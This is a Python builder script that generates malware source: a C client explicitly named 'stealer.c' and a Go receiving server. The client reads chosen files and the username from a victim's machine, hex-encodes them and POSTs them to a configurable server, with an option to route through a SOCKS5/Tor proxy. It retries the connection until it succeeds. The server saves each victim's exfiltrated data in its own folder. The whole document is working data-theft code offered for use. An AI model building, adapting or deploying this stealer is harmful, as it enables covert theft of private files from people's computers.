SERVER_FNAME = "server.go"
CLIENT_FNAME = "stealer.c"

SELECT_FILES = [
	"/home/user/Documents/GOPROG/HES/client.go", 
	"/home/user/Documents/GOPROG/HES/server.go"
]
SIZE_FILES = (5 << 20) # 5*(2^20)b = 5MiB

URL_ACTION = "/cmd"
IS_SOCKS5_CONNECT = False

ADDR = "127.0.0.1"
PORT = 8080
SOCKS5_PORT = 9050

def repeat_iter_string(quan, s) -> str:
	res = ""
	for i in range(quan):
		res += s%i
	return res

def repeat_string(quan, s) -> str:
	res = ""
	for i in range(quan):
		res += s
	return res

def insert_files(files) -> str:
	res = "{"
	for i in range(len(files)-1):
		res += f"\"{files[i]}\", "
	res += f"\"{files[-1]}\""
	res += "}"
	return res

def main():
	with open(SERVER_FNAME, "w") as file:
		file.write(SERVER_CODE)

	with open(CLIENT_FNAME, "w") as file:
		file.write(CLIENT_CODE)

SERVER_CODE = """
package main

import (
    "os"
	"fmt"
	"net/http"
    "io/ioutil"
    "crypto/sha256"
    "encoding/hex"
	"encoding/json"
)

const (
	MAXSIZE = """ + f"{(len(SELECT_FILES)*SIZE_FILES+256)}" + """
    ROOTDIR = "./saves/"
)

func init() {
    os.Mkdir(ROOTDIR, 0700)
}

func main() {
    fmt.Println("Server is listening...\\n")
    http.HandleFunc("/", indexPage)
    http.HandleFunc(""" + f"\"{URL_ACTION}\"" + """, cmdPage)
    http.ListenAndServe(""" + f"\":{PORT}\"" + """, nil)
}

func indexPage(w http.ResponseWriter, r *http.Request) {
    response(w, 0, "success: action completed")
}

func cmdPage(w http.ResponseWriter, r *http.Request) {
    var req struct {
    	OS int `json:"os"`
    	Name string `json:"name"`
    	Fdata []string `json:"fdata"`
    }

    if r.Method != "POST" {
        response(w, 1, "error: method != POST")
        return
    }

    if r.ContentLength > MAXSIZE {
		response(w, 2, "error: max size")
		return
	}

    err := json.NewDecoder(r.Body).Decode(&req)
    if err != nil {
        response(w, 3, "error: parse json")
        return
    }

    hash := hashSum(packJson(req))
    dirname := ROOTDIR + hexEncode(hash)
    os.Mkdir(dirname, 0700)

    ioutil.WriteFile(fmt.Sprintf("%s/__info__", dirname), []byte(fmt.Sprintf("%d:%s", req.OS, req.Name)), 0644)
    for i, v := range req.Fdata {
        if v == "" {
            continue
        }
        ioutil.WriteFile(fmt.Sprintf("%s/%d", dirname, i), hexDecode(v), 0644)
    }

    response(w, 0, "success: action completed")
}

func hashSum(data []byte) []byte {
    hash := sha256.Sum256(data)
    return hash[:]
}

func hexEncode(data []byte) string {
    return hex.EncodeToString(data)
}

func hexDecode(data string) []byte {
    res, err := hex.DecodeString(data)
    if err != nil {
        return nil
    }
    return res
}

func packJson(data interface{}) []byte {
    jsondata, err := json.Marshal(data)
    if err != nil {
        return nil 
    }
    return jsondata
}

func response(w http.ResponseWriter, ret int, res string) {
	w.Header().Set("Content-Type", "application/json")
	var resp struct {
		Return int    `json:"return"`
		Result string `json:"result"`
	}
	resp.Return = ret
	resp.Result = res
	json.NewEncoder(w).Encode(resp)
}
"""

CLIENT_CODE = """
#include "extclib/crypto.h"
#include "extclib/net.h"

#include <stdio.h>
#include <stdlib.h>
#include <string.h>
#include <unistd.h>

#define ADDRESS 	""" + (f"\"{ADDR}\", {PORT}, {SOCKS5_PORT}" if IS_SOCKS5_CONNECT else f"\"{ADDR}\", {PORT}") + """
#define NMAX_SIZE 	128
#define FMAX_READ 	""" + f"{len(SELECT_FILES)}" + """
#define FMAX_SIZE 	""" + f"{SIZE_FILES}" + """
#define BUFSIZ_SUM 	""" + f"{(len(SELECT_FILES)*SIZE_FILES+256)}" + """
#define PARSE_FILES """ + insert_files(SELECT_FILES) + """

typedef struct info_s {
	char os;
	char name[NMAX_SIZE];
	char fdata[FMAX_READ][FMAX_SIZE];
} info_s;

static void setjson(char *buffer, info_s *info);
static info_s *setinfo(info_s *info);

static int read_file(char *data, const char *filename);
static char *_strncpy(char *output, const char *input, size_t size);

static char buffer[BUFSIZ_SUM];
static info_s info;

int main(void) {
	net_conn *conn;
	setjson(buffer, setinfo(&info));

try_conn:
	conn = """ + ("net_socks5_connect(ADDRESS);" if IS_SOCKS5_CONNECT else "net_connect(ADDRESS);") + """
	if (conn == NULL) {
		sleep(5);
		goto try_conn;
	}

	net_http_post(conn, """ + f"\"{URL_ACTION}\"" + """, buffer);
	net_close(conn);
	return 0;
}

static void setjson(char *buffer, info_s *info) {
	snprintf(buffer, BUFSIZ_SUM, 
		"{"
			"\\"os\\":%d,"
			"\\"name\\":\\"%s\\","
			"\\"fdata\\": ["
				""" + repeat_string(len(SELECT_FILES)-1, '\"\\\"%s\\\",\" \n\t\t\t\t') + """"\\"%s\\""
			"]"
		"}",
		info->os,
		info->name,
		""" + repeat_iter_string(len(SELECT_FILES)-1, "info->fdata[%d],\n\t\t") + """info->fdata[""" + f"{len(SELECT_FILES)-1}" + """]
	);
}

static info_s *setinfo(info_s *info) {
	info->os = -1;
	_strncpy(info->name, "", NMAX_SIZE);
	for (size_t i = 0; i < FMAX_READ; ++i) {
		_strncpy(info->fdata[i], "", FMAX_SIZE);
	}
#ifdef __unix__
	info->os = 1;
	char *name = getenv("USER");
#elif _WIN32
	info->os = 2;
	char *name = getenv("USERNAME");
#endif
	if (name != NULL) {
		_strncpy(info->name, name, NMAX_SIZE);
	}
	const char *files[FMAX_READ] = PARSE_FILES;
	for (size_t i = 0; i < sizeof(files)/sizeof(files[0]); ++i) {
		read_file(info->fdata[i], files[i]);
	}
	return info;
}

static int read_file(char *data, const char *filename) {
	char bufferf[FMAX_SIZE/2];
	FILE *file = fopen(filename, "rb");
	if (file == NULL) {
		return 1;
	}
	size_t n = fread(bufferf, sizeof(char), FMAX_SIZE/2, file);
	crypto_hex(1, data, FMAX_SIZE, bufferf, n);
	return 0;
}

static char *_strncpy(char *output, const char *input, size_t size) {
	char *ret = strncpy(output, input, size-1);
	output[size-1] = '\\0';
	return ret;
}
"""

if __name__ == "__main__":
	main()
